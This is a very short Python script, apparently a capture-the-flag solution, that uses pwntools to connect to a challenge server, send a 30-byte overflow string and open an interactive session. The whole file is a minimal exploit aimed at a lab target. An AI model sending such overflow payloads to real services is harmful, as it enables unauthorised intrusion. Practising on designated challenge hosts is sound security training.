from pwn import *

with remote("chals.syssec.dk", 13334) as rem:
    rem.sendline(b'A'*30)
    rem.interactive()